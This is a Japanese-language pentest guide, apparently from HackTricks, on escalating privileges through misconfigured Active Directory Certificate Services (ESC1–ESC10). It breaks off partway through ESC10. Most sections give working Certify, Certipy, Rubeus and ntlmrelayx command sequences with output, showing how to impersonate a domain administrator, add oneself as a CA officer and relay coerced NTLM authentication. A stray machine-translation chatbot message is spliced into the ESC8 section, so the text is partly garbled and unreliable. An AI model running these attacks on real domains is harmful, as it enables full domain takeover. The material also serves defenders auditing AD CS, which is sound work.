# AD CS ドメインエスカレーション

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有する。

</details>

## 誤設定された証明書テンプレート - ESC1

### 説明

* **Enterprise CA** は **低権限ユーザーに登録権限を付与します**
* **管理者の承認が無効になっています**
* **承認された署名が必要ありません**
* 過度に許可的な **証明書テンプレート** セキュリティ記述子は、低権限ユーザーに証明書登録権を付与します
* **証明書テンプレートは、認証を可能にするEKUを定義しています**:
* _クライアント認証 (OID 1.3.6.1.5.5.7.3.2)、PKINITクライアント認証 (1.3.6.1.5.2.3.4)、スマートカードログオン (OID 1.3.6.1.4.1.311.20.2.2)、任意の目的 (OID 2.5.29.37.0)、またはEKUなし (SubCA)。_
* **証明書テンプレートは、CSR内でsubjectAltNameを指定するリクエスターを許可します:**
* **AD** は、証明書の **subjectAltName** (SAN) フィールドに **存在する場合**、そのアイデンティティを使用します。したがって、リクエスターがCSRでSANを指定できる場合、リクエスターは **任意のユーザーとして証明書を要求できます**（例えば、ドメイン管理者ユーザー）。証明書テンプレートのADオブジェクトは、リクエスターが **SANを指定できるかどうか** をその **`mspki-certificate-name-`**`flag` プロパティで **指定します**。`mspki-certificate-name-flag` プロパティは **ビットマスク** であり、**`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** フラグが **存在する場合**、**リクエスターはSANを指定できます。**

{% hint style="danger" %}
これらの設定により、**低権限ユーザーが任意のSANを持つ証明書を要求できるようになり**、低権限ユーザーがKerberosやSChannelを介してドメイン内の任意のプリンシパルとして認証できるようになります。
{% endhint %}

このオプションは、例えば、製品やデプロイメントサービスがHTTPS証明書やホスト証明書をその場で生成するために有効にされることがよくあります。または、知識不足のために有効にされることもあります。

この最後のオプションを持つ証明書が作成されると**警告が表示されます**が、この設定を持つ**証明書テンプレート**が**複製された場合**（`WebServer` テンプレートのように `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` が有効になっていて、その後管理者が認証OIDを追加する場合）は表示されません。

### 悪用

脆弱な証明書テンプレートを**見つける**には、次のコマンドを実行します:
```bash
Certify.exe find /vulnerable
certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128
```
**この脆弱性を悪用して管理者を偽装する**ためには、以下のコマンドを実行します:
```bash
Certify.exe request /ca:dc.theshire.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
生成された**証明書を `.pfx` 形式に変換し**、再度 Rubeus や certipy を使用して**認証することができます**：
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windowsのバイナリ「Certreq.exe」と「Certutil.exe」は、PFXを生成するために悪用される可能性があります：https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

さらに、以下のLDAPクエリをADフォレストの構成スキーマに対して実行することで、**承認/署名を必要としない**、**クライアント認証またはスマートカードログオンEKU**を持ち、**`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** フラグが有効になっている**証明書テンプレート**を**列挙**することができます：
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## 誤設定された証明書テンプレート - ESC2

### 説明

第二の悪用シナリオは、最初のものの変種です：

1. Enterprise CAが低権限ユーザーに登録権限を付与します。
2. マネージャー承認が無効になっています。
3. 承認された署名が必要ありません。
4. 過度に許容的な証明書テンプレートのセキュリティ記述子が低権限ユーザーに証明書の登録権限を付与します。
5. **証明書テンプレートがAny Purpose EKUを定義するか、EKUがありません。**

**Any Purpose EKU**は攻撃者がクライアント認証、サーバー認証、コード署名など、**任意の目的**のための**証明書**を取得することを可能にします。これを悪用するためには、**ESC3と同じ技術**が使用できます。

**EKUがない証明書** — つまり、従属CA証明書 — も**任意の目的**で悪用できますが、**新しい証明書に署名するためにも使用できます**。そのため、従属CA証明書を使用して、攻撃者は新しい証明書に任意のEKUやフィールドを**指定できます**。

しかし、**従属CAが**`NTAuthCertificates`**オブジェクトによって信頼されていない**場合（デフォルトでは信頼されていません）、攻撃者は**ドメイン認証**に使用できる**新しい証明書を作成できません**。それでも、攻撃者は任意のEKUと任意の証明書値を持つ**新しい証明書を作成できます**。攻撃者が潜在的に**悪用できる**ものは**たくさん**あります（例えば、コード署名、サーバー認証など）し、SAML、AD FS、IPSecなど、ネットワーク内の他のアプリケーションに大きな影響を与える可能性があります。

以下のLDAPクエリをADフォレストの構成スキーマに対して実行すると、このシナリオに該当するテンプレートを列挙することができます：
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## 誤設定された登録エージェントテンプレート - ESC3

### 説明

このシナリオは、最初と二番目のシナリオに似ていますが、**異なるEKU**（Certificate Request Agent）と**2つの異なるテンプレート**を**悪用**します（したがって、2つの要件セットがあります）。

**Certificate Request Agent EKU**（OID 1.3.6.1.4.1.311.20.2.1）、Microsoftのドキュメントでは**Enrollment Agent**として知られているものは、あるプリンシパルが**他のユーザーの代わりに** **証明書**の**登録**を行うことを許可します。

**「登録エージェント」**はそのような**テンプレート**に登録し、結果として得られた**証明書を使用して他のユーザーの代わりにCSRに共同署名**します。それから、**共同署名されたCSR**をCAに**送信**し、**「代わりに登録する」**ことを許可する**テンプレート**に登録します。そして、CAは**「他の」ユーザーに属する証明書**で応答します。

**要件1:**

1. エンタープライズCAが低権限ユーザーの登録権限を許可している。
2. マネージャーの承認が無効になっている。
3. 承認された署名が必要とされていない。
4. 過度に許可的な証明書テンプレートのセキュリティ記述子が低権限ユーザーに証明書の登録権限を許可している。
5. **証明書テンプレートがCertificate Request Agent EKUを定義している**。Certificate Request Agent OID（1.3.6.1.4.1.311.20.2.1）は、他のプリンシパルの代わりに他の証明書テンプレートを要求することを許可します。

**要件2:**

1. エンタープライズCAが低権限ユーザーの登録権限を許可している。
2. マネージャーの承認が無効になっている。
3. **テンプレートのスキーマバージョンが1または2以上で、Certificate Request Agent EKUを必要とするアプリケーションポリシー発行要件を指定している。**
4. 証明書テンプレートがドメイン認証を可能にするEKUを定義している。
5. CAに登録エージェントの制限が実装されていない。

### 悪用

このシナリオを悪用するには、[**Certify**](https://github.com/GhostPack/Certify)または[**Certipy**](https://github.com/ly4k/Certipy)を使用できます。
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:Vuln-EnrollmentAgent
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req 'corp.local/john:Pass0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
エンタープライズCAは、`certsrc.msc` `snap-in -> CAを右クリック -> Propertiesをクリック -> "Enrollment Agents"タブに移動`することで、**登録エージェント証明書**を取得できる**ユーザー**、登録エージェントが登録できるテンプレート、および登録エージェントが代わりに行動できる**アカウント**を**制限**できます。

しかし、**デフォルト**のCA設定は「**登録エージェントを制限しない**」です。管理者が「登録エージェントを制限する」を有効にしても、デフォルト設定は非常に許容的で、Everyoneが誰でもすべてのテンプレートに登録できるようになっています。

## 脆弱な証明書テンプレートアクセスコントロール - ESC4

### **説明**

**証明書テンプレート**には、ADの**プリンシパル**がテンプレートに対して特定の**権限**を持つことを指定する**セキュリティ記述子**があります。

**攻撃者**がテンプレートを**変更**し、**前のセクション**からの悪用可能な**ミスコンフィギュレーション**を**作成**するのに十分な**権限**を持っている場合、それを悪用して**権限を昇格**することができます。

証明書テンプレートに対する興味深い権利：

* **Owner:** オブジェクトの暗黙の完全制御、任意のプロパティを編集可能。
* **FullControl:** オブジェクトの完全制御、任意のプロパティを編集可能。
* **WriteOwner:** 所有者を攻撃者が制御するプリンシパルに変更可能。
* **WriteDacl:** アクセス制御を変更して攻撃者にFullControlを付与可能。
* **WriteProperty:** 任意のプロパティを編集可能。

### 悪用

前述のようなprivescの例：

<figure><img src="../../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>

ESC4は、ユーザーが証明書テンプレートに対する書き込み権限を持っている場合です。これは、例えば、証明書テンプレートの設定を上書きして、ESC1に対して脆弱にするために悪用される可能性があります。

上記のパスでわかるように、`JOHNPC`だけがこれらの権限を持っていますが、私たちのユーザー`JOHN`は`JOHNPC`に対する新しい`AddKeyCredentialLink`エッジを持っています。この技術は証明書に関連しているため、[Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)として知られるこの攻撃も実装しました。こちらはCertipyの`shadow auto`コマンドを使用して被害者のNTハッシュを取得する小さなプレビューです。

<figure><img src="../../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

**Certipy**は単一のコマンドで証明書テンプレートの設定を上書きすることができます。**デフォルト**では、CertipyはESC1に対して脆弱にするために設定を**上書き**します。また、攻撃後に設定を**復元**するのに役立つ**`-save-old`パラメータを指定して、古い設定を保存することもできます。
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### 説明

AD CSのセキュリティに影響を与える可能性のあるACLベースの関係の網は広範囲に及びます。証明書テンプレートや証明書機関自体以外の**オブジェクト**が**AD CSシステム全体のセキュリティに影響を与える可能性**があります。これらの可能性には以下が含まれますが、これに限定されません：

* **CAサーバーのADコンピューターオブジェクト**（例：S4U2SelfやS4U2Proxyを通じた侵害）
* **CAサーバーのRPC/DCOMサーバー**
* コンテナ`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`内の**任意の子孫ADオブジェクトやコンテナ**（例：証明書テンプレートコンテナ、証明書機関コンテナ、NTAuthCertificatesオブジェクト、登録サービスコンテナなど）

権限の低い攻撃者がこれらの**いずれかを制御**できるようになれば、攻撃者は**PKIシステムを侵害する可能性**が高くなります。

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### 説明

[**CQure Academyの投稿**](https://cqureacademy.com/blog/enhanced-key-usage)で説明されているように、**`EDITF_ATTRIBUTESUBJECTALTNAME2`**フラグに関連する類似の問題があります。Microsoftが説明するように、「このフラグがCAに**設定されている場合**、**任意のリクエスト**（Active Directory®から主題が構築される場合も含む）は、**主題代替名**に**ユーザー定義の値**を持つことができます。」\
これは、**攻撃者**がドメイン**認証**用に設定された**任意のテンプレート**に登録し、権限のないユーザーが登録できる（例：デフォルトのユーザーテンプレート）場合、ドメイン管理者（または**他のアクティブなユーザー/マシン**）として**認証**を許可する**証明書**を**取得**できることを意味します。

**注記**：ここでの**代替名**は、`certreq.exe`への`-attrib "SAN:"`引数を使用してCSRに**含まれています**（つまり、「名前値ペア」）。これはESC1での**SANの悪用**の方法とは**異なり**、証明書の属性にアカウント情報を**格納するのに対し、証明書拡張に格納する**という点が**異なります**。

### 悪用

組織は以下の`certutil.exe`コマンドを使用して、設定が有効かどうかを**確認**できます：
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
以下のコマンドも同様に機能する可能性があります。これは単に**リモート** **レジストリ**を使用しているだけです。
```
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify) と [**Certipy**](https://github.com/ly4k/Certipy) もこれをチェックし、この誤設定を悪用するために使用できます：
```bash
# Check for vulns, including this one
Certify.exe find

# Abuse vuln
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
これらの設定は、**ドメイン管理者**（または同等の）権限を持っていれば、任意のシステムから**設定**することができます：
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
環境でこの設定を見つけた場合、以下のコマンドで**このフラグを削除**できます:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
2022年5月のセキュリティアップデート以降、新しい**証明書**には**リクエスターの`objectSid`プロパティ**を埋め込む**セキュリティ拡張機能**が追加されます。ESC1では、このプロパティは指定されたSANから反映されますが、**ESC6**では、このプロパティはSANからではなく、**リクエスターの`objectSid`**を反映します。\
そのため、**ESC6を悪用するには**、環境が**ESC10**（弱い証明書マッピング）に**脆弱である必要があります**。ここでは、新しいセキュリティ拡張機能よりも**SANが優先されます**。
{% endhint %}

## 脆弱な証明書機関アクセスコントロール - ESC7

### 攻撃 1

#### 説明

証明書機関自体には、様々な**CAアクション**を保護する**一連の権限**があります。これらの権限は、`certsrv.msc`からアクセスし、CAを右クリックしてプロパティを選択し、セキュリティタブに切り替えることで確認できます：

<figure><img src="../../../.gitbook/assets/image (73) (2).png" alt=""><figcaption></figcaption></figure>

これは、[**PSPKIのモジュール**](https://www.pkisolutions.com/tools/pspki/)を使って`Get-CertificationAuthority | Get-CertificationAuthorityAcl`で列挙することもできます：
```bash
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-certificationAuthorityAcl | select -expand Access
```
#### 悪用

**`ManageCA`** 権限を持つプリンシパルが**証明機関**にある場合、**PSPKI** を使用して **`EDITF_ATTRIBUTESUBJECTALTNAME2`** ビットを切り替え、任意のテンプレートで **SAN** の指定を**許可**することができます（[ECS6](domain-escalation.md#editf\_attributesubjectaltname2-esc6)）：

<figure><img src="../../../.gitbook/assets/image (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (70) (2).png" alt=""><figcaption></figcaption></figure>

これは、[**PSPKIのEnable-PolicyModuleFlag**](https://www.sysadmins.lv/projects/pspki/enable-policymoduleflag.aspx) コマンドレットを使用して、より簡単な形でも可能です。

**`ManageCertificates`** 権限は、**保留中のリクエストを承認する**ことを許可し、その結果 "CA 証明書マネージャー承認" の保護を迂回します。

**Certify** と **PSPKI** モジュールの**組み合わせ**を使用して、証明書をリクエストし、承認し、ダウンロードすることができます：
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.theshire.local\theshire-DC-CA /id:336
```
### 攻撃 2

#### 説明

{% hint style="warning" %}
**前の攻撃**では、**`Manage CA`** 権限を使用して **ESC6 攻撃**を実行するために **EDITF\_ATTRIBUTESUBJECTALTNAME2** フラグを**有効**にしましたが、CA サービス (`CertSvc`) を再起動するまで効果はありません。ユーザーが `Manage CA` アクセス権を持っている場合、そのユーザーは**サービスの再起動**も許可されます。しかし、これはユーザーがサービスを**リモートで再起動できるという意味ではありません**。さらに、**ESC6 は最新のパッチが適用された環境では、2022年5月のセキュリティアップデートにより、すぐには機能しない可能性があります**。
{% endhint %}

したがって、ここでは別の攻撃方法を紹介します。

前提条件:

* **`ManageCA` 権限のみ**
* **`Manage Certificates`** 権限（**`ManageCA`** から付与可能）
* 証明書テンプレート **`SubCA`** が**有効**であること（**`ManageCA`** から有効化可能）

この技術は、`Manage CA` _および_ `Manage Certificates` アクセス権を持つユーザーが**失敗した証明書リクエストを発行できる**という事実に依存しています。**`SubCA`** 証明書テンプレートは **ESC1** に**脆弱**ですが、**管理者のみ**がテンプレートに登録できます。したがって、**ユーザー**は **`SubCA`** に登録することを**リクエスト**できますが、これは**拒否されます**が、**その後にマネージャーによって発行されます**。

#### 悪用

新しいオフィサーとして自分のユーザーを追加することで、自分自身に **`Manage Certificates`** アクセス権を**付与**できます。
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** テンプレートは、`-enable-template` パラメータを使用して **CA上で有効にすることができます**。デフォルトでは、`SubCA` テンプレートは有効になっています。
```bash
# List templates
certipy ca 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
以下は、攻撃のための前提条件を満たしている場合に開始する方法についての記述です。

**`SubCA` テンプレートに基づいた証明書のリクエストを行います。**

**このリクエストは拒否されますが**、プライベートキーを保存し、リクエストIDをメモしておきます。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
**`Manage CA` と `Manage Certificates`** を使用して、`ca` コマンドと `-issue-request <request ID>` パラメータを使って、**失敗した証明書のリクエストを発行** することができます。
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
最後に、`req` コマンドと `-retrieve <request ID>` パラメータを使用して、**発行された証明書を取得** できます。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay to AD CS HTTP Endpoints – ESC8

### 説明

{% hint style="info" %}
要約すると、**AD CSがインストールされている**環境で、**脆弱なWeb登録エンドポイント**があり、**ドメインコンピュータの登録とクライアント認証**を許可する**証明書テンプレート**（デフォルトの**`Machine`**テンプレートのような）が公開されている場合、**スプーラーサービスが実行されている任意のコンピュータを攻撃者が侵害する可能性があります**！
{% endhint %}

AD CSは、管理者がインストールできる追加のAD CSサーバーロールを介して、いくつかの**HTTPベースの登録方法**をサポートしています。これらのHTTPベースの証明書登録インターフェースはすべて**NTLMリレー攻撃に対して脆弱**です。NTLMリレーを使用すると、**侵害されたマシン上の攻撃者は、任意のインバウンドNTLM認証ADアカウントを偽装することができます**。被害者アカウントを偽装している間、攻撃者はこれらのWebインターフェースにアクセスし、**`User`または`Machine`証明書テンプレートに基づいてクライアント認証証明書を要求することができます**。

* **Web登録インターフェース**（`http://<caserver>/certsrv/`でアクセス可能な古い見た目のASPアプリケーション）は、デフォルトではHTTPのみをサポートしており、NTLMリレー攻撃に対する保護はできません。さらに、Authorization HTTPヘッダーを介してNTLM認証のみを明示的に許可するため、Kerberosのようなより安全なプロトコルは使用できません。
* **Certificate Enrollment Service**（CES）、**Certificate Enrollment Policy**（CEP）Webサービス、および**Network Device Enrollment Service**（NDES）は、Authorization HTTPヘッダーを介してデフォルトでネゴシエート認証をサポートしています。ネゴシエート認証はKerberosと**NTLM**を**サポート**しているため、攻撃者はリレー攻撃中にNTLM認証に**ダウングレードすることができます**。これらのWebサービスはデフォルトでHTTPSを有効にしていますが、残念ながらHTTPS自体は**NTLMリレー攻撃に対する保護にはなりません**。HTTPSがチャネルバインディングと組み合わされた場合のみ、HTTPSサービスはNTLMリレー攻撃から保護されます。残念ながら、AD CSはIIS上でExtended Protection for Authenticationを有効にしていないため、チャネルバインディングを有効にすることはできません。

NTLMリレー攻撃における一般的な**問題**は、**NTLMセッションが通常短い**ことと、攻撃者がNTLM署名を**強制する**サービスと対話**できない**ことです。

しかし、ユーザーへの証明書を取得するためにNTLMリレー攻撃を悪用すると、この制限を解決できます。なぜなら、セッションは証明書が有効である限り存続し、証明書はNTLM署名を**強制する**サービスを使用するために使用できるからです。盗まれた証明書の使用方法については、以下を確認してください：

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

NTLMリレー攻撃のもう一つの制限は、**被害者アカウントが攻撃者がコントロールするマシンに認証する必要がある**ことです。攻撃者は待つか、**強制**しようとするかもしれません：

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **悪用**

\*\*\*\*[**Certify**](https://github.com/GhostPack/Certify)の`cas`コマンドは、**有効なHTTP AD CSエンドポイントを列挙することができます**：
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>

エンタープライズCAは、`msPKI-Enrollment-Servers` プロパティのADオブジェクトに**CESエンドポイントを保存**します。**Certutil.exe** と **PSPKI** はこれらのエンドポイントを解析し、リストすることができます：
```
certutil.exe -enrollmentServerURL -config CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA
```
Since there is no English text provided outside of the markdown and HTML syntax, there is nothing to translate. If you provide the English text that needs to be translated, I can assist with the translation to Japanese.
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (8) (2) (2).png" alt=""><figcaption></figcaption></figure>

#### Certifyを悪用する
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy)を悪用する

デフォルトでは、Certipyはリレーされたアカウント名が`$`で終わるかどうかに応じて、`Machine`または`User`テンプレートに基づいて証明書を要求します。`-template`パラメータを使用して別のテンプレートを指定することができます。

その後、[PetitPotam](https://github.com/ly4k/PetitPotam)のような技術を使用して認証を強制することができます。ドメインコントローラーの場合、`-template DomainController`を指定する必要があります。
```
$ certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## セキュリティ拡張なし - ESC9 <a href="#5485" id="5485"></a>

### 説明

ESC9は、新しい**`msPKI-Enrollment-Flag`** の値 **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) を指します。このフラグが証明書テンプレートに設定されている場合、**新しい `szOID_NTDS_CA_SECURITY_EXT` セキュリティ拡張**は埋め込まれ**ません**。ESC9は `StrongCertificateBindingEnforcement` が `1` (デフォルト) に設定されている場合にのみ有用です。なぜなら、ESC9がない場合のESC10として、KerberosやSchannelのより弱い証明書マッピング構成を悪用できるからです — 要件は同じになります。

* `StrongCertificateBindingEnforcement` が `2` (デフォルト: `1`) に設定されていない、または `CertificateMappingMethods` に `UPN` フラグが含まれている
* 証明書に `msPKI-Enrollment-Flag` 値の `CT_FLAG_NO_SECURITY_EXTENSION` フラグが含まれている
* 証明書が任意のクライアント認証 EKU を指定している
* アカウントAに対する `GenericWrite` 権限を持っていて、任意のアカウントBを侵害する

### 悪用

このケースでは、`John@corp.local` は `Jane@corp.local` に対する `GenericWrite` 権限を持っており、`Administrator@corp.local` を侵害したいと考えています。`Jane@corp.local` は `msPKI-Enrollment-Flag` 値に `CT_FLAG_NO_SECURITY_EXTENSION` フラグを指定した証明書テンプレート `ESC9` に登録することが許可されています。

まず、例えばShadow Credentialsを使用して（`GenericWrite` を使用して）、`Jane` のハッシュを取得します。

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (22).png" alt=""><figcaption></figcaption></figure>

次に、`Jane` の `userPrincipalName` を `Administrator` に変更します。`@corp.local` 部分は省略していることに注意してください。

<figure><img src="../../../.gitbook/assets/image (2) (2) (3).png" alt=""><figcaption></figcaption></figure>

これは制約違反ではありません。なぜなら `Administrator` ユーザーの `userPrincipalName` は `Administrator@corp.local` であり、`Administrator` ではないからです。

次に、脆弱な証明書テンプレート `ESC9` をリクエストします。証明書は `Jane` としてリクエストする必要があります。

<figure><img src="../../../.gitbook/assets/image (16) (2).png" alt=""><figcaption></figcaption></figure>

証明書の `userPrincipalName` が `Administrator` であり、発行された証明書に「オブジェクトSID」が含まれていないことに注意してください。

その後、`Jane` の `userPrincipalName` を元の `userPrincipalName` である `Jane@corp.local` などに戻します。

<figure><img src="../../../.gitbook/assets/image (24) (2).png" alt=""><figcaption></figcaption></figure>

今、証明書で認証を試みると、`Administrator@corp.local` ユーザーのNTハッシュを受け取ります。証明書にドメインが指定されていないため、コマンドラインに `-domain <domain>` を追加する必要があります。

<figure><img src="../../../.gitbook/assets/image (3) (1) (3).png" alt=""><figcaption></figcaption></figure>

## 弱い証明書マッピング - ESC10

### 説明

ESC10はドメインコントローラー上の2つのレジストリキー値を指します。

`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` の `CertificateMappingMethods`。デフォルト値 `0x18` (`0x8 | 0x10`)、以前は `0x1F`。

`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` の `StrongCertificateBindingEnforcement`。デフォルト値 `1`、以前は `0`。

**ケース1**

`StrongCertificateBindingEnforcement` が `0` に設定されている

**ケース2**

`CertificateMappingMethods` に `UPN` ビット (`0x4`) が含まれている

### 悪用ケース1

* `StrongCertificateBindingEnforcement` が `0` に設定されている
* アカウントAに対する `GenericWrite` 権限を持っていて、任意のアカウントBを侵害する

このケースでは、`John@corp.local` は `Jane@corp.local` に対する `GenericWrite` 権限を持っており、`Administrator@corp.local` を侵害したいと考えています。悪用手順はESC9とほぼ同じですが、任意の証明書テンプレートを使用できます。

まず、例えばShadow Credentialsを使用して（`GenericWrite` を使用して）、`Jane` のハッシュを取得します。

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (19).png" alt=""><figcaption></figcaption></figure>

次に、`Jane` の `userPrincipalName` を `Administrator` に変更します。`@corp.local` 部分は省略していることに注意してください。

<figure><img src="../../../.gitbook/assets/image (5) (3).png" alt=""><figcaption></figcaption></figure>

これは制約違反ではありません。なぜなら `Administrator` ユーザーの `userPrincipalName` は `Administrator@corp.local` であり、`Administrator` ではないからです。

